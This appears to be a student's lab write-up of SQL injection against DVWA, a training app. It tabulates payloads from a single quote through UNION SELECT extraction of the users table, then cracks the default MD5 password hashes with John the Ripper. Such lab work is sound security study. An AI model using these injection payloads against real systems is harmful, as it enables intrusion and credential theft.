## DVWA SQLi — Low security

### Payload testing

| Payload | Result | Why |
|---|---|---|
| `'` | HTTP 500 error | Closes the string early, breaking the query's syntax. Confirms the field is injectable. No visible error message (display_errors likely off) — so this is a blind signal, not error-based disclosure in this case. |
| `"`, `#`, `!`, `%` | No change | None of these interact with the query's actual syntax here. `"` isn't the string delimiter (single quotes are); `#`/`!` are inert while trapped inside the quoted string; `%` only means something inside a LIKE clause, and this query uses `=`. |
| `' OR '1'='1` | Returned all records | Makes the WHERE clause true for every row. |
| `' OR '1'='1'--` (no space) | HTTP 500 error | MySQL requires a space (or other whitespace) after `--` for it to register as a comment. Without it, the trailing `--'` is invalid syntax. |
| `' OR '1'='1'-- ` (with trailing space) | Returned all records | Comment now correctly swallows the rest of the query; same effect as the OR payload above. |
| `' UNION SELECT null, null -- ` | Returned NULL in both display fields | Confirms the query has exactly 2 output columns, and that a 2-column UNION executes cleanly before attempting to pull real data. |
| `' UNION SELECT user, password FROM users -- ` | Returned usernames and password hashes for all 5 users, mapped into the First name / Surname display fields | Confirms column count (2) and types are compatible with the `users` table's `user`/`password` columns. Pulls an entirely different table than the page was designed to show. |

### Credential cracking

| Username | Hash (MD5) | Cracked password |
|----------|-----------------------------------|-------------------|
| admin    | 5f4dcc3b5aa765d61d8327deb882cf99   | password |
| gordonb  | e99a18c428cb38d5f260853678922e03   | abc123 |
| 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b   | charley |
| pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7   | letmein |
| smithy   | 5f4dcc3b5aa765d61d8327deb882cf99   | password |

- Hash type: Unsalted MD5 (32 hex characters), confirmed via `john --format=raw-md5`
- Tool: John the Ripper, wordlist = rockyou.txt
- Result: 5/5 users cracked in under a second
- Note: admin and smithy share the identical hash `5f4dcc3b5aa765d61d8327deb882cf99`.
  Since MD5 here is unsalted, identical plaintexts always produce identical
  hashes — this reveals the two accounts share a password even before
  cracking either one.

### Finding summary

SQL injection in the `id` parameter of `vulnerabilities/sqli/` (GET request)
allows an unauthenticated UNION-based extraction of the full `users` table,
including unsalted MD5 password hashes for all 5 accounts. All 5 passwords
were recovered in under a second using John the Ripper against the
rockyou.txt wordlist, demonstrating full credential compromise from a
single injection point.
